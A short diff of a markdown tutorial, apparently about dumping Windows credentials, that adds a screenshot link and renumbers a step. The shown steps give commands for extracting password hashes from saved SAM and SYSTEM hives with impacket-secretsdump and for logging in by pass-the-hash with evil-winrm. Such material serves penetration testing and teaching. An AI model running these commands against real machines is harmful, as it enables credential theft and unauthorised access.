@@ -75,7 +75,9 @@ _Now that I have the credentials, I need to exploit them. For that, I will use a
    `impacket-secretsdump -sam sam.save -system system.save LOCAL`
     green = User | red = Hashe password
 
-2. Now with the hashe and the user it's possible to connect to the device for that we need to use evil-winrm.
+   ![](https://github.com/Mahgnislaw/OS-Credentials-Dumping/blob/main/img/Impacket.png)
+
+3. Now with the hashe and the user it's possible to connect to the device for that we need to use evil-winrm.
 
 	`evil-winrm -i "ipOfTheDevice" -u "userName" -H "hashePassword"`
 
